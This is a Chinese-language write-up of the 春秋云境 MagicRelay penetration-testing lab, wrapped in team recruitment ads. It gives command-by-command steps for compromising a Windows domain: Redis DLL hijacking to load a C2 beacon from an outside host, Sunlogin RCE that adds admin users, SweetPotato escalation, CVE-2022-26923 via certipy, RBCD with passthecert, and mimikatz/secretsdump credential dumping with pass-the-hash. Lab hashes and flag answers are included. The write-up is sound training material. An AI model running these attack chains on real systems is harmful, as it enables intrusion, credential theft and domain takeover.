# 春秋云境MagicRelay WP

> 原文: https://www.ctfiot.com/230509.html
> ID: 230509

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

靶标介绍：

Legacy Network 是一家在信息技术领域拥有 20 年历史的老牌企业，专注于为中小型公司提供IT解决方案和支持服务。由于长期依赖于过时的基础设施和内部网络，Legacy Network 在现代化的安全防护体系方面存在许多不足，特别是在权限控制、过时的软件、未及时更新补丁等方面存在显著问题。你的目标是通过渗透进入该网络，获取每台机器的权限，该靶场共有 4个Flag，分布于不同的靶机。

涉及的知识点

redis dll劫持上线cs马
向日葵 RCE
SeImpersonatePrivilege配合甜土豆提权
Active Directory域权限提升漏洞（CVE-2022-26923）
passthecert打RBCD攻击
哈希传递

flag1

fscan只扫到一个redis未授权，Another Redis Desktop Manager连上去发现是redis 3的版本，Windows系统

start infoscan
39.98.125.24:6379 open
[*] alive ports len is: 1
start vulscan
[+] Redis 39.98.125.24:6379 unauthorized file:C:Program FilesRedis/dump.rdb
已完成 1/1
[*] 扫描结束,耗时: 10.1216089s

一开始也是想了几种思路，都没利用起来：

主从复制得redis4.0以上才能打

机器没有web服务，也写不了webshell

写启动项必须要重启机器才能生效

写MOF也没生效，应该不是win2019的机器

dll劫持，跟着一篇公众号文章没复现出来

修改以下属性

C/C++ -> 代码生成 -> 运行库改为多线程调试

C/C++ -> 代码生成 -> 安全检查改为禁用

链接器 -> 生成清单改为否

将生成的dll文件通过RedisWriteFile写入到靶机，redis安装路径可连接后用info命令查看

python3 RedisWriteFile.py --rhost 39.98.117.52 --rport 6379 --lhost 8.138.89.236  --lport 16379 --rpath 'C:\Program Files\Redis\' --rfile 'dbghelp.dll' --lfile 'dbghelp.dll'

写入后通过bgsave命令触发劫持，上线cs马

administrator权限，vshell上线直接能拿第一个flag

flag{58455a83-7516-4a8f-92bf-ca94e7aa33a0}

flag2

传gost和fscan

start infoscan
(icmp) Target 172.22.12.6     is alive
(icmp) Target 172.22.12.12    is alive
(icmp) Target 172.22.12.25    is alive
(icmp) Target 172.22.12.31    is alive
[*] Icmp alive hosts len is: 4
172.22.12.6:88 open
172.22.12.25:6379 open
172.22.12.31:445 open
172.22.12.25:445 open
172.22.12.12:445 open
172.22.12.6:445 open
172.22.12.31:139 open
172.22.12.25:139 open
172.22.12.12:139 open
172.22.12.6:139 open
172.22.12.31:135 open
172.22.12.25:135 open
172.22.12.12:135 open
172.22.12.6:135 open
172.22.12.31:80 open
172.22.12.12:80 open
172.22.12.31:21 open
[*] alive ports len is: 17
start vulscan
[*] NetInfo
[*]172.22.12.25
   [->]WIN-YUYAOX9Q
   [->]172.22.12.25
[*] NetInfo
[*]172.22.12.31
   [->]WIN-IISQE3PC
   [->]172.22.12.31
[*] NetInfo
[*]172.22.12.12
   [->]WIN-AUTHORITY
   [->]172.22.12.12
[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
[*] NetInfo
[*]172.22.12.6
   [->]WIN-SERVER
   [->]172.22.12.6
[*] NetBios 172.22.12.31    WORKGROUPWIN-IISQE3PC
[*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.12.6  (Windows Server 2016 Standard 14393)
[+] ftp 172.22.12.31:21:anonymous 
   [->]SunloginClient_11.0.0.33826_x64.exe
[*] WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
[+] PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect 
[+] Redis 172.22.12.25:6379 unauthorized file:C:Program FilesRedis/dump.rdb
已完成 17/17
[*] 扫描结束,耗时: 14.3460105s

得到以下信息：

172.22.12.31 WIN-IISQE3PC，有向日葵

172.22.12.6 WIN-SERVER，DC

172.22.12.25 WIN-YUYAOX9Q，有redis

172.22.12.12 WIN-AUTHORITY，有AD CS

接着直接利用拿到system权限

sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "whoami"

可以加管理员账户rdp，或者直接打印拿第二个flag

sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net user simho whoami@123 /add"
sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net localgroup administrators simho /add"

sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:UsersAdministratorflagflag02.txt"

flag{29a46b72-8a82-182a-45f3-532475ec6fd4}

flag4

接着回去看redis那台机器，有SeImpersonatePrivilege特权，那可以直接土豆提权了

用甜土豆提权成system

C:/Users/Public/sweetpotato.exe -a "whoami"

发现有域环境

这里直接甜土豆去执行sharphound收集命令没成功，先system身份上线之后再去收集

拓扑图只看到DC这台机器，而且也没啥东西

cs以system权限上线，能抓到WIN-YUYAOX9Q$机器用户的NTLM

* Username : WIN-YUYAOX9Q$
* Domain   : XIAORANG
* NTLM     : e611213c6a712f9b18a8d056005a4f0f
* SHA1     : 1a8d2c95320592037c0fa583c1f62212d4ff8ce9

因为扫到了AD CS，certify收集一下信息（用system权限）

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=xiaorang,DC=lab'

[*] Listing info about the Enterprise CA 'xiaorang-WIN-AUTHORITY-CA'

    Enterprise CA Name            : xiaorang-WIN-AUTHORITY-CA
    DNS Hostname                  : WIN-AUTHORITY.xiaorang.lab
    FullName                      : WIN-AUTHORITY.xiaorang.labxiaorang-WIN-AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=xiaorang-WIN-AUTHORITY-CA, DC=xiaorang, DC=lab
    Cert Thumbprint               : 10944A7D8B6C6CBC7EE267DD6DBF3C0624FE7F08
    Cert Serial                   : 2E92B9E129A646B84641219EFBDB1EB3
    Cert Start Date               : 2022/10/29 10:50:19
    Cert End Date                 : 2027/10/29 11:00:19
    Cert Chain                    : CN=xiaorang-WIN-AUTHORITY-CA,DC=xiaorang,DC=lab
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTINAdministrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITYAuthenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTINAdministrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               XIAORANGDomain Admins        S-1-5-21-3745972894-1678056601-2622918667-512
      Allow  ManageCA, ManageCertificates               XIAORANGEnterprise Admins    S-1-5-21-3745972894-1678056601-2622918667-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!

接下来就是像2022网鼎杯那样打CVE-2022-26923域提权漏洞，先配一下hosts

172.22.12.6 WIN-SERVER.xiaorang.lab
172.22.12.12 WIN-AUTHORITY.xiaorang.lab

现在还需要一个知道账密的机器用户，利用前面WIN-YUYAOX9Q$机器用户创建一个新的机器用户

proxychains4 certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user simho -dns WIN-SERVER.xiaorang.lab -debug

simho$/YNj8hDLLR82VNLZq

接着利用该机器用户以及前面certify收集的CA name获取pfx凭证

利用证书获取域控hash时，跟Certify那个靶场报一样的错

proxychains4 certipy req -u 'simho$@xiaorang.lab' -p 'YNj8hDLLR82VNLZq' -ca 'xiaorang-WIN-AUTHORITY-CA' -target 172.22.12.12 -template 'Machine' -debug -dc-ip 172.22.12.6

proxychains4 certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug

按照Schannel步骤来，从.pfx分别导出.key文件和.crt文件，并将密码置空

openssl pkcs12 -in win-server.pfx -nodes -out win-server.pem
openssl rsa -in win-server.pem -out win-server.key
openssl x509 -in win-server.pem -out win-server.crt
proxychains4 certipy cert -pfx win-server.pfx -nokey -out win-server.crt
proxychains4 certipy cert -pfx win-server.pfx -nocert -out win-server.key 

接下来用passthecert打RBCD攻击

将证书传递到 LDAP，修改 LDAP 配置从而获得域控权限

proxychains4 python3 passthecert.py -action whoami -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6

将证书配置到域控的RBCD

proxychains4 python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to 'win-server$' -delegate-from 'simho$'

申请CIFS服务票据

proxychains4 impacket-getST xiaorang.lab/'simho$':'YNj8hDLLR82VNLZq' -spn cifs/WIN-SERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6

导入票据

export KRB5CCNAME=Administrator.ccache

导入后即可无密码登录

proxychains4 impacket-psexec Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6

拿到域控flag

flag{4c7d6e81-3161-4853-b93f-349ab74a60e5}

flag3

在域控那台机器添加管理员账号，rdp连接上去后，将mimikatz.exe放到System32文件夹下，然后以system权限导哈希

mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"

或者学c1trus师傅用SAM转储

proxychains4 impacket-secretsdump 'xiaorang.lab/administrator@win-server.xiaorang.lab' -target-ip 172.22.12.6 -no-pass -k

......
[*] Dumping Domain Credentials (domainuid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:135  ...  OK
[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::
......

接着PTH到172.22.12.12机器拿最后一个flag

proxychains4 impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk

type C:UsersAdministratorflag03.txt

flag{317621a6-bb66-4154-b157-365c871d52d2}

参考文章

c1trus-春秋云境MagicRelay(https://c1trus.top/24-%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/magicrelay.html)

内网渗透—春秋云镜篇之2022网鼎杯(https://cloud.tencent.com/developer/article/2391445)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
Legacy Network 是一家在信息技术领域拥有 20 年历史的老牌企业，专注于为中小型公司提供IT解决方案和支持服务。由于长期依赖于过时的基础设施和内部网络，Legacy Network 在现代化的安全防护体系方面存在许多不足，特别是在权限控制、过时的软件、未及时更新补丁等方面存在显著问题。你的目标是通过渗透进入该网络，获取每台机器的权限，该靶场共有 4个Flag，分布于不同的靶机。
```



```
redis dll劫持上线cs马
向日葵 RCE
SeImpersonatePrivilege配合甜土豆提权
Active Directory域权限提升漏洞（CVE-2022-26923）
passthecert打RBCD攻击
哈希传递
```



```
start infoscan
39.98.125.24:6379 open
[*] alive ports len is: 1
start vulscan
[+] Redis 39.98.125.24:6379 unauthorized file:C:Program FilesRedis/dump.rdb
已完成 1/1
[*] 扫描结束,耗时: 10.1216089s
```



```
python3 DllHijacker.py dbghelp.dll
```



```
python3 RedisWriteFile.py --rhost 39.98.117.52 --rport 6379 --lhost 8.138.89.236  --lport 16379 --rpath 'C:\Program Files\Redis\' --rfile 'dbghelp.dll' --lfile 'dbghelp.dll'
```



```
flag{58455a83-7516-4a8f-92bf-ca94e7aa33a0}
```



```
start infoscan
(icmp) Target 172.22.12.6     is alive
(icmp) Target 172.22.12.12    is alive
(icmp) Target 172.22.12.25    is alive
(icmp) Target 172.22.12.31    is alive
[*] Icmp alive hosts len is: 4
172.22.12.6:88 open
172.22.12.25:6379 open
172.22.12.31:445 open
172.22.12.25:445 open
172.22.12.12:445 open
172.22.12.6:445 open
172.22.12.31:139 open
172.22.12.25:139 open
172.22.12.12:139 open
172.22.12.6:139 open
172.22.12.31:135 open
172.22.12.25:135 open
172.22.12.12:135 open
172.22.12.6:135 open
172.22.12.31:80 open
172.22.12.12:80 open
172.22.12.31:21 open
[*] alive ports len is: 17
start vulscan
[*] NetInfo
[*]172.22.12.25
   [->]WIN-YUYAOX9Q
   [->]172.22.12.25
[*] NetInfo
[*]172.22.12.31
   [->]WIN-IISQE3PC
   [->]172.22.12.31
[*] NetInfo
[*]172.22.12.12
   [->]WIN-AUTHORITY
   [->]172.22.12.12
[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
[*] NetInfo
[*]172.22.12.6
   [->]WIN-SERVER
   [->]172.22.12.6
[*] NetBios 172.22.12.31    WORKGROUPWIN-IISQE3PC
[*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.12.6  (Windows Server 2016 Standard 14393)
[+] ftp 172.22.12.31:21:anonymous 
   [->]SunloginClient_11.0.0.33826_x64.exe
[*] WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
[+] PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect 
[+] Redis 172.22.12.25:6379 unauthorized file:C:Program FilesRedis/dump.rdb
已完成 17/17
[*] 扫描结束,耗时: 14.3460105s
```



```
sunRce.exe -t scan -h 172.22.12.31 -p 40000-50000
```



```
sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "whoami"
```



```
sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net user simho whoami@123 /add"
sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net localgroup administrators simho /add"

sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:UsersAdministratorflagflag02.txt"
```



```
flag{29a46b72-8a82-182a-45f3-532475ec6fd4}
```



```
C:/Users/Public/sweetpotato.exe -a "whoami"
```



```
* Username : WIN-YUYAOX9Q$
* Domain   : XIAORANG
* NTLM     : e611213c6a712f9b18a8d056005a4f0f
* SHA1     : 1a8d2c95320592037c0fa583c1f62212d4ff8ce9
```



```
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=xiaorang,DC=lab'

[*] Listing info about the Enterprise CA 'xiaorang-WIN-AUTHORITY-CA'

    Enterprise CA Name            : xiaorang-WIN-AUTHORITY-CA
    DNS Hostname                  : WIN-AUTHORITY.xiaorang.lab
    FullName                      : WIN-AUTHORITY.xiaorang.labxiaorang-WIN-AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=xiaorang-WIN-AUTHORITY-CA, DC=xiaorang, DC=lab
    Cert Thumbprint               : 10944A7D8B6C6CBC7EE267DD6DBF3C0624FE7F08
    Cert Serial                   : 2E92B9E129A646B84641219EFBDB1EB3
    Cert Start Date               : 2022/10/29 10:50:19
    Cert End Date                 : 2027/10/29 11:00:19
    Cert Chain                    : CN=xiaorang-WIN-AUTHORITY-CA,DC=xiaorang,DC=lab
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTINAdministrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITYAuthenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTINAdministrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               XIAORANGDomain Admins        S-1-5-21-3745972894-1678056601-2622918667-512
      Allow  ManageCA, ManageCertificates               XIAORANGEnterprise Admins    S-1-5-21-3745972894-1678056601-2622918667-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!
```



```
172.22.12.6 WIN-SERVER.xiaorang.lab
172.22.12.12 WIN-AUTHORITY.xiaorang.lab
```



```
proxychains4 certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user simho -dns WIN-SERVER.xiaorang.lab -debug
```



```
simho$/YNj8hDLLR82VNLZq
```



```
proxychains4 certipy req -u 'simho$@xiaorang.lab' -p 'YNj8hDLLR82VNLZq' -ca 'xiaorang-WIN-AUTHORITY-CA' -target 172.22.12.12 -template 'Machine' -debug -dc-ip 172.22.12.6

proxychains4 certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug
```



```
openssl pkcs12 -in win-server.pfx -nodes -out win-server.pem
openssl rsa -in win-server.pem -out win-server.key
openssl x509 -in win-server.pem -out win-server.crt
proxychains4 certipy cert -pfx win-server.pfx -nokey -out win-server.crt
proxychains4 certipy cert -pfx win-server.pfx -nocert -out win-server.key
```



```
proxychains4 python3 passthecert.py -action whoami -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6
```



```
proxychains4 python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to 'win-server$' -delegate-from 'simho$'
```



```
proxychains4 impacket-getST xiaorang.lab/'simho$':'YNj8hDLLR82VNLZq' -spn cifs/WIN-SERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
```



```
export KRB5CCNAME=Administrator.ccache
```



```
proxychains4 impacket-psexec Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6
```



```
flag{4c7d6e81-3161-4853-b93f-349ab74a60e5}
```



```
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
```



```
proxychains4 impacket-secretsdump 'xiaorang.lab/administrator@win-server.xiaorang.lab' -target-ip 172.22.12.6 -no-pass -k
```



```
......
[*] Dumping Domain Credentials (domainuid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:135  ...  OK
[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::
......
```



```
proxychains4 impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk

type C:UsersAdministratorflag03.txt
```



```
flag{317621a6-bb66-4154-b157-365c871d52d2}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/5-1741533295.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/4-1741533297.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/10-1741533297.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/8-1741533298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/7-1741533301.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/0-1741533302.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/1-1741533303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/9-1741533303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/5-1741533303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/6-1741533304.png)